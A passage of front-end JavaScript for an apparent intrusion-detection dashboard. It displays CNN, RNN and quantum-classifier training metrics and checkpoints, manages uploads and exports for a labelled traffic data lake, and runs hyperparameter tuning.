  setEl("tm-normal",   m.normal    != null ? m.normal.toLocaleString()   : "—");
  setEl("tm-attack",   m.attack    != null ? m.attack.toLocaleString()   : "—");

  // ── accuracy cards ─────────────────────────────────────────
  setEl("tm-acc",     m.cnn_accuracy != null ? m.cnn_accuracy + "%" : "—");
  setEl("tm-rnn-acc", m.rnn_accuracy != null ? m.rnn_accuracy + "%" : "—");

  // ── label distribution ─────────────────────────────────────
  const dist = s.label_distribution || {};
  const distEl = document.getElementById("tm-label-dist");
  if (distEl && Object.keys(dist).length > 0) {
    const total  = Object.values(dist).reduce((a, b) => a + b, 0) || 1;
    const lines  = Object.entries(dist)
      .sort((a, b) => b[1] - a[1])
      .map(([lbl, cnt]) => {
        const pct  = ((cnt / total) * 100).toFixed(1);
        const bar  = "█".repeat(Math.round(pct / 5));
        return `<span style="color:var(--text1);font-weight:600">${lbl}</span>: ${cnt} (${pct}%) <span style="color:var(--accent);letter-spacing:-1px">${bar}</span>`;
      })
      .join("<br>");
    distEl.innerHTML = "<strong style='color:var(--text1)'>Label Distribution</strong><br>" + lines;
    distEl.style.display = "block";
  } else if (distEl) {
    distEl.style.display = "none";
  }

  document.getElementById("train-metrics").style.display = "block";
}

async function loadTrainMetrics() {
  try {
    const r = await fetch("/api/train-status");
    const d = await r.json();
    if (d.stage === "done" || (d.metrics && d.metrics.samples)) {
      renderTrainMetrics(d);
      if (d.stage === "done") {
        document.getElementById("train-progress-wrap").style.display = "none";
      }
    }
  } catch (_) {}
}

// ───────────────────────────────────────────
// Checkpoints Tab
// ───────────────────────────────────────────
async function loadQuantumMetrics() {
  try {
    const r = await fetch("/api/quantum-metrics");
    const q = await r.json();
    if (!q.available) return;

    // Badge row
    setEl("qm-badge-optimizer", (q.optimizer || "SPSA") + " Optimizer");
    setEl("qm-badge-status",    q.is_trained ? "✓ Trained" : "Not Trained");
    const saved = q.saved_at
      ? new Date(q.saved_at).toLocaleString("en-US", { dateStyle:"short", timeStyle:"short" })
      : "—";
    setEl("qm-badge-date", "Last saved: " + saved);

    // Stat cards
    setEl("qm-qubits", q.n_qubits  != null ? q.n_qubits  : "—");
    setEl("qm-layers", q.n_layers  != null ? q.n_layers  : "—");
    setEl("qm-params", q.n_params  != null ? q.n_params  : "—");
    setEl("qm-iters",  q.optimizer_iterations != null ? q.optimizer_iterations : "—");

    // Accuracy cards — show row only if at least one value exists
    const trainAcc   = q.train_accuracy   != null ? q.train_accuracy   + "%" : null;
    const datasetAcc = q.dataset_accuracy != null ? q.dataset_accuracy + "%" : null;
    const accRow = document.getElementById("qm-acc-row");
    if (accRow && (trainAcc || datasetAcc)) {
      setEl("qm-train-acc",   trainAcc   || "—");
      setEl("qm-dataset-acc", datasetAcc || "—");

      // Color-code: ≥90% green, ≥70% yellow, else red
      ["qm-train-acc", "qm-dataset-acc"].forEach(id => {
        const el  = document.getElementById(id);
        const val = parseFloat(el && el.textContent);
        if (!el || isNaN(val)) return;
        el.style.color = val >= 90 ? "var(--green,#22c55e)"
                       : val >= 70 ? "#f59e0b"
                       : "var(--red,#ef4444)";
      });

      // Hide dataset card if no dataset evaluation yet
      const dsBox = document.getElementById("qm-dataset-acc-box");
      if (dsBox) dsBox.style.display = datasetAcc ? "" : "none";
      accRow.style.display = "";
    }

    // Mark trained badge color
    const statusBadge = document.getElementById("qm-badge-status");
    if (statusBadge) {
      statusBadge.style.background = q.is_trained
        ? "var(--green,#22c55e)"
        : "var(--red,#ef4444)";
    }
  } catch (_) {}
}

async function loadCheckpoints() {
  try {
    const r = await fetch("/api/status");
    const d = await r.json();
    renderCheckpoints(d.checkpoints || {});
  } catch (_) {}
  loadTrainMetrics();        // refresh last dataset training metrics
  loadQuantumMetrics();      // refresh Quantum AI model metrics
  loadModelTrainStatus();    // restore per-model (CNN/RNN/Quantum) manual train metrics
}

async function loadModelTrainStatus() {
  try {
    const r = await fetch("/api/train/status");
    if (!r.ok) return;
    const statuses = await r.json();
    for (const [key, s] of Object.entries(statuses)) {
      if (!s.done || s.val_acc === null || s.val_acc === undefined) continue;
      const progDiv   = document.getElementById(`model-train-progress-${key}`);
      const metricsEl = document.getElementById(`model-val-metrics-${key}`);
      if (progDiv) {
        progDiv.style.display = "flex";
        _setModelTrainBar(key, 100, s.message || `✓ ${key.toUpperCase()} trained`);
      }
      if (metricsEl) {
        metricsEl.style.display = "flex";
        const accPct  = (s.val_acc * 100).toFixed(1);
        const accEl   = document.getElementById(`val-acc-${key}`);
        const lossEl  = document.getElementById(`val-loss-${key}`);
        const splitEl = document.getElementById(`val-split-${key}`);
        if (accEl) {
          accEl.textContent = `${accPct}%`;
          accEl.className   = `val-metric-value${s.val_acc >= 0.65 ? "" : " val-metric-warn"}`;
        }
        if (lossEl)  lossEl.textContent  = s.val_loss != null ? Number(s.val_loss).toFixed(4) : "—";
        if (splitEl) splitEl.textContent = s.n_train && s.n_val ? `${s.n_train} / ${s.n_val}` : "—";
      }
    }
  } catch(_) {}
}

const MODEL_META = {
  quantum_ai:       { name: "Quantum AI",          icon: "⚛️",  sub: "QNN + SPSA" },
  classical_rnn:    { name: "RNN (PyTorch)",        icon: "🔁", sub: "Multi-layer RNN" },
  classical_cnn:    { name: "CNN (PyTorch)",        icon: "🧠", sub: "Conv1d + MaxPool" },
  cosine_similarity:{ name: "Cosine Similarity",   icon: "📐", sub: "Vector similarity" },
  embedding_engine: { name: "Embedding Engine",    icon: "📦", sub: "Word2Vec style" },
  data_lake:        { name: "Reference Data Lake", icon: "🗄️",  sub: "Attack patterns" },
};

function renderCheckpoints(checks) {
  const grid = document.getElementById("model-grid");
  if (!grid) return;
  grid.innerHTML = Object.entries(checks).map(([key, ok]) => {
    const m = MODEL_META[key] || { name: key, icon: "📎", sub: "" };
    return `
      <div class="model-card ${ok ? "model-ok" : "model-miss"}">
        <div class="model-card-icon">${m.icon}</div>
        <div>
          <div class="model-card-name">${m.name}</div>
          <div class="model-card-sub">${m.sub}</div>
          <div style="margin-top:6px;font-size:12px;font-weight:700;color:${ok?"#22c55e":"#ef4444"}">
            ${ok ? "✓ Checkpoint Available" : "✗ No Checkpoint"}
          </div>
        </div>
      </div>`;
  }).join("");
}

// ───────────────────────────────────────────
// Data Lake Tab
// ───────────────────────────────────────────
let _dlEntries  = [];
let _dlChart    = null;

const DL_TYPE_COLORS = [
  "#38bdf8","#ef4444","#f97316","#a855f7","#22c55e",
  "#eab308","#ec4899","#06b6d4","#84cc16","#6366f1",
];

// ── Data Lake Upload ──────────────────────

function dlFileSelected(input) {
  if (input.files && input.files[0]) dlUploadFile(input.files[0]);
  input.value = "";
}

function dlDrop(e) {
  e.preventDefault();
  const f = e.dataTransfer.files && e.dataTransfer.files[0];
  if (f) dlUploadFile(f);
}

let _dlUploadTimer = null;
let _dlUploadJobId = null;

function dlUploadFile(file) {
  const ext = file.name.split(".").pop().toLowerCase();
  if (!["csv", "txt", "json"].includes(ext)) {
    showDLUploadResult(false, "Unsupported file type. Please upload a CSV, TXT, or JSON file.");
    return;
  }

  if (_dlUploadTimer) { clearInterval(_dlUploadTimer); _dlUploadTimer = null; }
  _dlUploadJobId = null;

  const wrap = document.getElementById("dl-upload-result");
  wrap.style.display = "block";
  wrap.innerHTML = `
    <div style="font-size:12px;color:var(--text2);margin-bottom:6px">
      📤 <strong>${file.name}</strong> uploading… (${(file.size/1024).toFixed(1)} KB)
    </div>
    <div class="dl-upload-prog-bg">
      <div class="dl-upload-prog-fill" id="dl-prog-fill" style="width:3%"></div>
    </div>
    <div id="dl-prog-label" style="font-size:11px;color:var(--text2);margin-top:5px">Dosya parse ediliyor…</div>`;

  const fd = new FormData();
  fd.append("file", file);

  fetch("/api/datalake/upload", { method: "POST", body: fd })
    .then(r => r.json())
    .then(d => {
      if (!d.success || !d.job_id) {
        const errMsg = d.error || "Unknown error";
        const isLabelErr = errMsg.toLowerCase().includes("etiket") || errMsg.toLowerCase().includes("label");
        const hint = isLabelErr
          ? `<div style="margin-top:8px;padding:8px 10px;background:rgba(255,255,255,0.07);border-radius:6px;font-size:11px;line-height:1.6">
               <strong>Your CSV must contain one of the following columns:</strong><br>
               <code>label</code>, <code>attack_type</code>, <code>class</code>, <code>category</code>, <code>type</code><br>
               Sample row: <code>label,source_ip,protocol</code><br><code>Normal,192.168.1.1,TCP</code><br>
               <a href="/api/datalake/sample-csv" download="sample_data.csv"
                  style="color:var(--accent);text-decoration:underline">📥 Download sample CSV</a>
             </div>`
          : "";
        showDLUploadResult(false, errMsg + hint);
        return;
      }
      _dlUploadJobId = d.job_id;
      const setBar = (pct, msg) => {
        const bar = document.getElementById("dl-prog-fill");
        const lbl = document.getElementById("dl-prog-label");
        if (bar) bar.style.width = pct + "%";
        if (lbl) lbl.textContent = msg;
      };
      setBar(5, `${d.total} rows queued — processing…`);

      _dlUploadTimer = setInterval(async () => {
        try {
          const sr = await fetch(`/api/datalake/upload-status/${_dlUploadJobId}`);
          const s  = await sr.json();
          const pct = s.total > 0 ? Math.round((s.done / s.total) * 100) : 0;
          setBar(Math.max(pct, 5), `${s.done} / ${s.total} rows processed (${pct}%)`);

          if (s.status === "done") {
            clearInterval(_dlUploadTimer); _dlUploadTimer = null;
            const breakdown = Object.entries(s.type_counts || {})
              .sort((a, b) => b[1] - a[1])
              .map(([l, c]) => `<span class="dl-badge ${l.toLowerCase()==='normal'?'dl-badge-normal':'dl-badge-attack'}">${l}</span> ${c}`)
              .join(" &nbsp; ");
            showDLUploadResult(true,
              `<strong>${s.added}</strong> records added` +
              (s.skipped > 0 ? ` <span style="color:var(--text2);font-size:11px">(${s.skipped} rows skipped)</span>` : "") +
              `<div style="margin-top:8px;display:flex;flex-wrap:wrap;gap:6px;align-items:center">${breakdown}</div>` +
              `<div style="font-size:11px;color:var(--text2);margin-top:6px">Data Lake total: <strong style="color:var(--accent)">${s.total_now}</strong> records</div>`
            );
            loadDataLake();
          } else if (s.status === "error") {
            clearInterval(_dlUploadTimer); _dlUploadTimer = null;
            showDLUploadResult(false, s.error || "Processing error");
          }
        } catch (_) {}
      }, 800);
    })
    .catch(e => {
      showDLUploadResult(false, "Connection error: " + e.message);
    });
}

function showDLUploadResult(ok, html) {
  const wrap = document.getElementById("dl-upload-result");
  if (!wrap) return;
  wrap.style.display = "block";
  wrap.innerHTML = ok
    ? `<div class="dl-upload-ok">${html}</div>`
    : `<div class="dl-upload-err">✗ Error: ${html}</div>`;
}

function loadDataLake() {
  fetch("/api/datalake")
    .then(r => r.json())
    .then(data => {
      if (!data.available) {
        document.getElementById("dl-table-body").innerHTML =
          `<tr><td colspan="5" class="empty">${data.reason || "No data found"}</td></tr>`;
        return;
      }
      setEl("dl-total",   data.total);
      setEl("dl-attacks", data.attack_count);
      setEl("dl-normals", data.normal_count);
      setEl("dl-types",   data.unique_attack_types);

      _dlEntries = data.entries || [];
      renderDLTable(_dlEntries);
      renderDLTypeRows(data.attack_type_dist || {});
      renderDLChart(data.attack_type_dist || {});
    })
    .catch(e => console.error("DataLake load error:", e));
}

function renderDLTable(entries) {
  const tbody = document.getElementById("dl-table-body");
  if (!entries.length) {
    tbody.innerHTML = `<tr><td colspan="5" class="empty">No records</td></tr>`;
    return;
  }
  tbody.innerHTML = entries.map(e => {
    const isAttack = e.binary === 1;
    const labelBadge = isAttack
      ? `<span class="dl-badge dl-badge-attack">${e.label}</span>`
      : `<span class="dl-badge dl-badge-normal">${e.label}</span>`;
    const classBadge = isAttack
      ? `<span class="dl-badge dl-badge-attack">Attack</span>`
      : `<span class="dl-badge dl-badge-normal">Normal</span>`;
    const normPct = Math.min(e.vector_norm * 100, 100).toFixed(0);
    const normBar = `
      <div style="display:flex;align-items:center;gap:6px">
        <div class="mini-bar-bg" style="width:70px">
          <div class="mini-bar-fill" style="width:${normPct}%;background:var(--accent)"></div>
        </div>
        <span style="font-size:11px;color:var(--text2)">${e.vector_norm}</span>
      </div>`;
    return `<tr>
      <td style="color:var(--text2);font-size:11px">${e.index + 1}</td>
      <td style="font-family:monospace;font-size:11px;color:var(--text2)">${e.event_id}</td>
      <td>${labelBadge}</td>
      <td>${classBadge}</td>
      <td>${normBar}</td>
    </tr>`;
  }).join("");
}

function filterDLTable() {
  const q = (document.getElementById("dl-search")?.value || "").toLowerCase().trim();
  const filtered = q
    ? _dlEntries.filter(e => e.label.toLowerCase().includes(q) || e.event_id.toLowerCase().includes(q))
    : _dlEntries;
  renderDLTable(filtered);
}

function exportDataLake() {
  const btn = document.getElementById("dl-export-btn");
  const originalText = btn ? btn.innerHTML : "";
  if (btn) { btn.disabled = true; btn.innerHTML = "⏳ Preparing…"; }

  fetch("/api/datalake/export")
    .then(res => {
      if (!res.ok) return res.json().then(d => { throw new Error(d.error || "Download error"); });
      const cd = res.headers.get("Content-Disposition") || "";
      const match = cd.match(/filename=(.+)/);
      const filename = match ? match[1] : "data_lake_export.csv";
      return res.blob().then(blob => ({ blob, filename }));
    })
    .then(({ blob, filename }) => {
      const url = URL.createObjectURL(blob);
      const a   = document.createElement("a");
      a.href     = url;
      a.download = filename;
      document.body.appendChild(a);
      a.click();
      document.body.removeChild(a);
      URL.revokeObjectURL(url);
    })
    .catch(err => alert("CSV download error: " + err.message))
    .finally(() => {
      if (btn) { btn.disabled = false; btn.innerHTML = originalText; }
    });
}

function resetDataLake() {
  const confirmed = confirm(
    "Reset Data Lake?\n\n" +
    "All uploaded records will be deleted and only the built-in base attack patterns will be reloaded.\n\n" +
    "This action cannot be undone."
  );
  if (!confirmed) return;

  const btn = document.getElementById("dl-reset-btn");
  const origText = btn ? btn.innerHTML : "";
  if (btn) { btn.disabled = true; btn.innerHTML = "⏳ Resetting…"; }

  const resultEl = document.getElementById("dl-upload-result");

  fetch("/api/datalake/reset", { method: "POST" })
    .then(res => res.json())
    .then(data => {
      if (data.success) {
        if (resultEl) {
          resultEl.style.display = "block";
          resultEl.innerHTML = `<div style="color:var(--green);font-size:13px">✓ ${data.message}</div>`;
          setTimeout(() => { resultEl.style.display = "none"; }, 4000);
        }
        loadDataLake();
      } else {
        alert("Reset error: " + (data.error || "Unknown error"));
      }
    })
    .catch(err => alert("Reset error: " + err.message))
    .finally(() => {
      if (btn) { btn.disabled = false; btn.innerHTML = origText; }
    });
}

function renderDLTypeRows(dist) {
  const container = document.getElementById("dl-type-rows");
  const entries = Object.entries(dist).sort((a, b) => b[1] - a[1]);
  const total   = entries.reduce((s, [, v]) => s + v, 0) || 1;
  container.innerHTML = entries.map(([label, count], i) => {
    const pct  = ((count / total) * 100).toFixed(1);
    const col  = label === "Normal" ? "var(--green)" : DL_TYPE_COLORS[i % DL_TYPE_COLORS.length];
    return `
      <div class="dl-type-row">
        <div style="display:flex;justify-content:space-between;margin-bottom:4px">
          <span style="font-size:12px;font-weight:600;color:var(--text1)">${label}</span>
          <span style="font-size:11px;color:var(--text2)">${count} records &nbsp;·&nbsp; ${pct}%</span>
        </div>
        <div class="dl-bar-bg">
          <div class="dl-bar-fill" style="width:${pct}%;background:${col}"></div>
        </div>
      </div>`;
  }).join("");
}

function renderDLChart(dist) {
  const ctx = document.getElementById("dl-chart-dist");
  if (!ctx) return;
  if (_dlChart) { _dlChart.destroy(); _dlChart = null; }

  const entries = Object.entries(dist).sort((a, b) => b[1] - a[1]);
  const labels  = entries.map(([l]) => l);
  const values  = entries.map(([, v]) => v);
  const colors  = labels.map((l, i) =>
    l === "Normal" ? "#22c55e" : DL_TYPE_COLORS[i % DL_TYPE_COLORS.length]
  );

  _dlChart = new Chart(ctx, {
    type: "doughnut",
    data: { labels, datasets: [{ data: values, backgroundColor: colors, borderWidth: 1, borderColor: "#1e293b" }] },
    options: {
      responsive: true,
      plugins: {
        legend: {
          position: "bottom",
          labels: { color: "#94a3b8", font: { size: 11 }, padding: 10, boxWidth: 12 },
        },
        tooltip: {
          callbacks: {
            label: ctx => ` ${ctx.label}: ${ctx.parsed} records`,
          },
        },
      },
      cutout: "62%",
    },
  });
}

// ───────────────────────────────────────────
// Architecture Configuration
// ───────────────────────────────────────────
let _archPresets  = {};
let _activePreset = { cnn: null, rnn: null, quantum: null };

async function loadArchConfig() {
  try {
    const r = await fetch("/api/arch/config");
    const d = await r.json();
    _archPresets = d.presets || {};

    renderArchPresets("cnn",     _archPresets.cnn     || {});
    renderArchPresets("rnn",     _archPresets.rnn     || {});
    renderArchPresets("quantum", _archPresets.quantum  || {});

    const cur = d.current || {};
    fillArchForm("cnn",     cur.cnn     || {});
    fillArchForm("rnn",     cur.rnn     || {});
    fillArchForm("quantum", cur.quantum || {});

    highlightActivePresets(cur);
    updateQParams();
    _archConfigLoaded = true;
  } catch(e) {
    console.error("Arch config load error:", e);
  }
}

function renderArchPresets(model, presets) {
  const container = document.getElementById(`arch-presets-${model}`);
  if (!container) return;
  container.innerHTML = Object.entries(presets).map(([key, p]) => {
    const isCurrent = p.is_current ? " preset-current" : "";
    return `<button class="arch-preset-btn${isCurrent}"
                    id="arch-preset-${model}-${key}"
                    onclick="applyArchPreset('${model}','${key}')">${p.label}</button>`;
  }).join("");
}

function highlightActivePresets(cur) {
  ["cnn", "rnn", "quantum"].forEach(model => {
    const psets = _archPresets[model] || {};
    const cfg   = cur[model] || {};
    // Clear all
    document.querySelectorAll(`[id^="arch-preset-${model}-"]`).forEach(b => b.classList.remove("arch-preset-active"));
    // Find matching preset
    for (const [key, p] of Object.entries(psets)) {
      if (_presetMatchesCfg(model, p, cfg)) {
        const btn = document.getElementById(`arch-preset-${model}-${key}`);
        if (btn) btn.classList.add("arch-preset-active");
        _activePreset[model] = key;
        const desc = document.getElementById(`arch-desc-${model}`);
        if (desc) { desc.textContent = p.desc || ""; desc.style.display = p.desc ? "block" : "none"; }
        break;
      }
    }
  });
}

function _presetMatchesCfg(model, preset, cfg) {
  const keys = {
    cnn:     ["n_conv_layers","conv1_out","conv2_out","fc_hidden","kernel_size","dropout","epochs","learning_rate"],
    rnn:     ["hidden_size","num_layers","dropout","epochs","learning_rate"],
    quantum: ["n_qubits","n_hidden_layers","max_iterations","learning_rate","perturbation"],
  }[model] || [];
  return keys.every(k => !(k in preset) || Number(preset[k]) === Number(cfg[k]));
}

function fillArchForm(model, cfg) {
  for (const [key, val] of Object.entries(cfg)) {
    const el = document.getElementById(`af-${model}-${key}`);
    if (el) el.value = val;
  }
}

function applyArchPreset(model, presetKey) {
  const preset = (_archPresets[model] || {})[presetKey];
  if (!preset) return;

  fillArchForm(model, preset);

  // Update active highlight
  document.querySelectorAll(`[id^="arch-preset-${model}-"]`).forEach(b => b.classList.remove("arch-preset-active"));
  const btn = document.getElementById(`arch-preset-${model}-${presetKey}`);
  if (btn) btn.classList.add("arch-preset-active");
  _activePreset[model] = presetKey;

  // Show description
  const desc = document.getElementById(`arch-desc-${model}`);
  if (desc) { desc.textContent = preset.desc || ""; desc.style.display = preset.desc ? "block" : "none"; }

  if (model === "quantum") updateQParams();
}

function clearArchPreset(model) {
  document.querySelectorAll(`[id^="arch-preset-${model}-"]`).forEach(b => b.classList.remove("arch-preset-active"));
  _activePreset[model] = null;
}

function updateQParams() {
  const q = parseInt(document.getElementById("af-quantum-n_qubits")?.value || 8, 10);
  const l = parseInt(document.getElementById("af-quantum-n_hidden_layers")?.value || 4, 10);
  const nQ = 2 * q * l;
  const nC = q + 1;
  setEl("q-quantum-count",   nQ);
  setEl("q-classical-count", nC);
  setEl("q-param-count",     nQ + nC);
}

function readArchForm() {
  const num = (id)       => parseFloat(document.getElementById(id)?.value ?? 0);
  const int = (id)       => parseInt(document.getElementById(id)?.value ?? 0, 10);
  return {
    cnn: {
      n_conv_layers: int("af-cnn-n_conv_layers"),
      conv1_out:     int("af-cnn-conv1_out"),
      conv2_out:     int("af-cnn-conv2_out"),
      fc_hidden:     int("af-cnn-fc_hidden"),
      kernel_size:   int("af-cnn-kernel_size"),
      dropout:       num("af-cnn-dropout"),
      epochs:        int("af-cnn-epochs"),
      learning_rate: num("af-cnn-learning_rate"),
    },
    rnn: {
      hidden_size:   int("af-rnn-hidden_size"),
      num_layers:    int("af-rnn-num_layers"),
      dropout:       num("af-rnn-dropout"),
      epochs:        int("af-rnn-epochs"),
      learning_rate: num("af-rnn-learning_rate"),
    },
    quantum: {
      n_qubits:        int("af-quantum-n_qubits"),
      n_hidden_layers: int("af-quantum-n_hidden_layers"),
      max_iterations:  int("af-quantum-max_iterations"),
      learning_rate:   num("af-quantum-learning_rate"),
      perturbation:    num("af-quantum-perturbation"),
    },
  };
}

async function saveArchConfig() {
  const msg = document.getElementById("arch-save-msg");
  if (msg) { msg.style.color = "var(--text2)"; msg.textContent = "Saving…"; }
  try {
    const r = await fetch("/api/arch/config", {
      method:  "POST",
      headers: { "Content-Type": "application/json" },
      body:    JSON.stringify(readArchForm()),
    });
    const d = await r.json();
    if (d.ok) {
      if (msg) { msg.style.color = "var(--green)"; msg.textContent = "✓ " + d.message; }
    } else {
      if (msg) { msg.style.color = "var(--red)";   msg.textContent = "✗ " + (d.error || "Error"); }
    }
  } catch(e) {
    if (msg) { msg.style.color = "var(--red)"; msg.textContent = "✗ Connection error"; }
  }
  setTimeout(() => { if (msg) msg.textContent = ""; }, 5000);
}

async function saveAndRetrain() {
  await saveArchConfig();
  setTimeout(() => startSystem(true), 600);
}

// ───────────────────────────────────────────
// Auto Tuning Mode
// ───────────────────────────────────────────
let _tunePollTimer = null;

function _parseTuneNums(id) {
  const el = document.getElementById(id);
  if (!el || !el.value.trim()) return [];
  return el.value.split(",")
    .map(s => s.trim())
    .filter(s => s !== "")
    .map(Number)
    .filter(n => !isNaN(n));
}

function updateTuneCount() {
  const cnt = id => Math.max(1, _parseTuneNums(id).length);
  const cnn = cnt("tr-cnn-n_conv_layers") * cnt("tr-cnn-conv1_out") *
               cnt("tr-cnn-conv2_out")    * cnt("tr-cnn-fc_hidden")  *
               cnt("tr-cnn-dropout")      * cnt("tr-cnn-kernel_size");
  const rnn = cnt("tr-rnn-hidden_size") * cnt("tr-rnn-num_layers") * cnt("tr-rnn-dropout");
  const q   = cnt("tr-q-n_qubits") * cnt("tr-q-n_hidden_layers") * cnt("tr-q-max_iterations");
  const total = cnn + rnn + q;
  const el = document.getElementById("tune-trial-count");
  if (!el) return;
  const warn = total > 150 ? " ⚠️ May take very long!" : total > 60 ? " ℹ️ May take a while" : "";
  el.textContent = `Total ${total} trials  (CNN: ${cnn} · RNN: ${rnn} · Q: ${q})${warn}`;
  el.className = total > 150 ? "tune-trial-count tune-trial-warn"
               : total > 60  ? "tune-trial-count tune-trial-caution"
               : "tune-trial-count";
}

function toggleSkipFullRetrain(cb) {
  const fullField = document.getElementById("tune-full-epochs-field");
  if (fullField) fullField.style.opacity = cb.checked ? "0.35" : "1";
}

async function startAutoTune() {
  const btn = document.getElementById("btn-tune-start");
  if (btn) { btn.disabled = true; btn.textContent = "⏳ Tuning in progress…"; }
  const stopBtn = document.getElementById("btn-tune-stop");
  if (stopBtn) { stopBtn.disabled = false; stopBtn.textContent = "⏹ Stop Tuning"; }

  document.getElementById("tune-progress-wrap")?.style.setProperty("display", "block");
  document.getElementById("tune-results-wrap") ?.style.setProperty("display", "none");
  document.getElementById("tune-best-wrap")    ?.style.setProperty("display", "none");
  setEl("tune-counter", "");
  _setTuneBadge("", false);
  _setTuneBar(5, "Starting…");

  const skipFull = document.getElementById("tune-skip-full-retrain")?.checked || false;

  const ranges = {
    cnn: {
      n_conv_layers: _parseTuneNums("tr-cnn-n_conv_layers"),
      conv1_out:     _parseTuneNums("tr-cnn-conv1_out"),
      conv2_out:     _parseTuneNums("tr-cnn-conv2_out"),
      fc_hidden:     _parseTuneNums("tr-cnn-fc_hidden"),
      dropout:       _parseTuneNums("tr-cnn-dropout"),
      kernel_size:   _parseTuneNums("tr-cnn-kernel_size"),
    },
    rnn: {
      hidden_size: _parseTuneNums("tr-rnn-hidden_size"),
      num_layers:  _parseTuneNums("tr-rnn-num_layers"),
      dropout:     _parseTuneNums("tr-rnn-dropout"),
    },
    quantum: {
      n_qubits:         _parseTuneNums("tr-q-n_qubits"),
      n_hidden_layers:  _parseTuneNums("tr-q-n_hidden_layers"),
      max_iterations:   _parseTuneNums("tr-q-max_iterations"),
    },
    epochs_fast:        parseInt(document.getElementById("tune-fast-epochs")?.value || "20"),
    epochs_full:        parseInt(document.getElementById("tune-full-epochs")?.value || "50"),
    skip_full_retrain:  skipFull,
  };

  try {
    const r = await fetch("/api/tune/start", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(ranges),
    });
    const d = await r.json();
    if (!r.ok || d.error) {
      _setTuneBar(0, `✗ ${d.error || "Error"}`);
      if (btn) { btn.disabled = false; btn.textContent = "⚡ Start Tuning"; }
      if (stopBtn) stopBtn.disabled = true;
      return;
    }
    _startTunePoll();
  } catch(e) {
    _setTuneBar(0, "✗ Connection error");
    if (btn) { btn.disabled = false; btn.textContent = "⚡ Start Tuning"; }
    if (stopBtn) stopBtn.disabled = true;
  }
}

function _setTuneBar(pct, msg) {
  const bar = document.getElementById("tune-progress-bar");
  const txt = document.getElementById("tune-progress-msg");
  if (bar) bar.style.width = `${pct}%`;
  if (txt) txt.textContent = msg || "";
}

function _setTuneBadge(phase, show) {
  const el = document.getElementById("tune-phase-badge");
  if (!el) return;
  if (!show) { el.style.display = "none"; return; }
  const labels = {
    cnn: "📊 CNN", rnn: "🔄 RNN", quantum: "⚛️ Quantum",
    retrain: "💾 Full Training", eval: "📐 Evaluating",
    done: "✓ Completed", cancelled: "⏹ Stopped",
  };
  el.textContent = labels[phase] || phase.toUpperCase();
  el.className   = `tune-phase-badge tune-phase-${phase}`;
  el.style.display = "inline-flex";
}

async function stopAutoTune() {
  const stopBtn = document.getElementById("btn-tune-stop");
  if (stopBtn) { stopBtn.disabled = true; stopBtn.textContent = "⏳ Stopping…"; }
  try {
    const r = await fetch("/api/tune/cancel", { method: "POST" });
    const d = await r.json();
    if (!d.ok) {
      if (stopBtn) { stopBtn.disabled = false; stopBtn.textContent = "⏹ Stop Tuning"; }
    }
    // leave disabled=true after success — poll will re-enable or keep disabled
  } catch(e) {
    if (stopBtn) { stopBtn.disabled = false; stopBtn.textContent = "⏹ Stop Tuning"; }
  }
}

function _startTunePoll() {
  if (_tunePollTimer) return;
  _tunePollTimer = setInterval(_pollTuneStatus, 2000);
}

async function _pollTuneStatus() {
  try {
    const r = await fetch("/api/tune/status");
    if (!r.ok) return;
    const s = await r.json();

    _setTuneBar(s.progress, s.message);
    _setTuneBadge(s.phase, !!s.phase && s.phase !== "start");
    if (s.total_trials > 0)
      setEl("tune-counter", `${s.completed_trials} / ${s.total_trials} trials`);

    const stopBtn = document.getElementById("btn-tune-stop");
    if (s.running) {
      if (stopBtn) { stopBtn.disabled = false; stopBtn.textContent = "⏹ Stop Tuning"; }
    }

    if (s.trials && s.trials.length > 0) {
      document.getElementById("tune-results-wrap")?.style.setProperty("display", "block");
      _renderTrials(s.trials, s.best || {});
    }

    if (!s.running) {
      clearInterval(_tunePollTimer);
      _tunePollTimer = null;
      const btn = document.getElementById("btn-tune-start");
      if (btn) { btn.disabled = false; btn.textContent = "⚡ Start Tuning"; }
      if (stopBtn) { stopBtn.disabled = true; stopBtn.textContent = "⏹ Stop Tuning"; }

      if ((s.done || s.cancelled) && s.best) {
        document.getElementById("tune-best-wrap")?.style.setProperty("display", "block");
        _renderBest(s.best, s.saved);
      }

      // Refresh model cards and per-model metrics so the newly saved
      // checkpoint files and updated val_acc values appear immediately.
      loadCheckpoints();
    }
  } catch(e) { /* silent */ }
}

function _renderTrials(trials, best) {
  const tbody = document.getElementById("tune-trials-body");
  if (!tbody) return;
  const bestAcc = {
    CNN:     best.cnn     ? best.cnn.val_acc     : -1,
    RNN:     best.rnn     ? best.rnn.val_acc     : -1,
    Quantum: best.quantum ? best.quantum.val_acc : -1,
  };
  const fullEpochs = parseInt(document.getElementById("tune-full-epochs")?.value || "50");
  tbody.innerHTML = trials.slice().reverse().map(t => {
    const overfit  = t.overfit === true;
    const isBest   = !overfit && t.val_acc >= bestAcc[t.model] && t.val_acc > 0;
    const rowClass = overfit ? "tune-overfit-row" : isBest ? "tune-best-row-tr" : "";
    const accClass = t.val_acc >= 80 ? "tune-acc-high" : t.val_acc >= 55 ? "tune-acc-mid" : "tune-acc-low";
    const modelKey = t.model.toLowerCase();
    const paramsEsc = encodeURIComponent(JSON.stringify(t.params));
    const labelEsc  = encodeURIComponent(t.label);

    const trainCell = t.train_acc != null
      ? `<span class="tune-dim">${t.train_acc}%</span>`
      : `<span class="tune-dim">—</span>`;
    const gapVal  = t.gap != null ? t.gap : null;
    const gapCell = gapVal != null
      ? `<span class="${gapVal > 40 ? "tune-gap-high" : gapVal > 20 ? "tune-gap-mid" : "tune-gap-ok"}">${gapVal > 0 ? "+" : ""}${gapVal}pp</span>`
      : `<span class="tune-dim">—</span>`;
    const overfitBadge = overfit
      ? ` <span class="tune-overfit-badge" title="Gap between train and validation accuracy &gt;40pp — excluded from best selection">⚠ Overfit</span>`
      : "";

    return `<tr class="${rowClass}">
      <td><span class="tune-model-badge tune-model-${modelKey}">${t.model}</span></td>
      <td class="tune-label">${t.label}${isBest ? ' <span class="tune-star">★</span>' : ''}${overfitBadge}</td>
      <td><span class="${accClass}">${t.val_acc}%</span></td>
      <td>${trainCell}</td>
      <td>${gapCell}</td>
      <td class="tune-dim">${t.n_params.toLocaleString()}</td>
      <td><button class="tune-load-btn" onclick="loadTuningTrial('${modelKey}',decodeURIComponent('${paramsEsc}'),'${labelEsc}',${fullEpochs})">▶ Load</button></td>
    </tr>`;
  }).join("");
}

function _renderBest(best, saved) {
  const grid = document.getElementById("tune-best-grid");
  if (!grid) return;
  const defs = [
    { key: "cnn",     label: "CNN",     icon: "📊" },
